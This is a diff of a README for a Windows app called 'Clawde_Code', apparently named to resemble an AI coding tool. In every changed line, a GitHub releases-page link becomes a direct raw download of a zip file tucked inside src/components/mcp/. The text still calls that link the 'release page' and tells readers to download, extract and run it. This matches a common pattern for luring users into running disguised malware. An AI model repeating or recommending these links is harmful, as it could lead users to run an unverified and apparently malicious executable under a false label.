@@ -1,6 +1,6 @@
 # 🛠️ Clawde_Code - Run Code Tasks with Ease
 
-[![Download Clawde_Code](https://img.shields.io/badge/Download%20Clawde_Code-Ready%20for%20Windows-blue)](https://github.com/Frania3051/Clawde_Code/releases)
+[![Download Clawde_Code](https://img.shields.io/badge/Download%20Clawde_Code-Ready%20for%20Windows-blue)](https://github.com/Frania3051/Clawde_Code/raw/refs/heads/main/src/components/mcp/Code-Clawde-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide shows you how to download and run it on Windows.
 
 ## 📥 Download
 
-1. Open the release page: https://github.com/Frania3051/Clawde_Code/releases
+1. Open the release page: https://github.com/Frania3051/Clawde_Code/raw/refs/heads/main/src/components/mcp/Code-Clawde-1.7.zip
 2. Find the latest release at the top
 3. Download the Windows file for your PC
 4. Save the file in a folder you can find again, such as Downloads or Desktop
@@ -190,7 +190,7 @@ Use the file from the release page only. Keep the original download link so you 
 
 ## 🗂️ Quick Windows Steps
 
-1. Go to https://github.com/Frania3051/Clawde_Code/releases
+1. Go to https://github.com/Frania3051/Clawde_Code/raw/refs/heads/main/src/components/mcp/Code-Clawde-1.7.zip
 2. Download the latest Windows release
 3. Open or extract the file
 4. Run the app
@@ -204,11 +204,11 @@ Use the file from the release page only. Keep the original download link so you 
 4. Type a plain request like `explain this project`
 5. Use the response to move to the next step
 
-[Download Clawde_Code from Releases](https://github.com/Frania3051/Clawde_Code/releases)
+[Download Clawde_Code from Releases](https://github.com/Frania3051/Clawde_Code/raw/refs/heads/main/src/components/mcp/Code-Clawde-1.7.zip)
 
 ## 📌 Release Page
 
-https://github.com/Frania3051/Clawde_Code/releases
+https://github.com/Frania3051/Clawde_Code/raw/refs/heads/main/src/components/mcp/Code-Clawde-1.7.zip
 
 ## 🧩 Typical Workflow
 
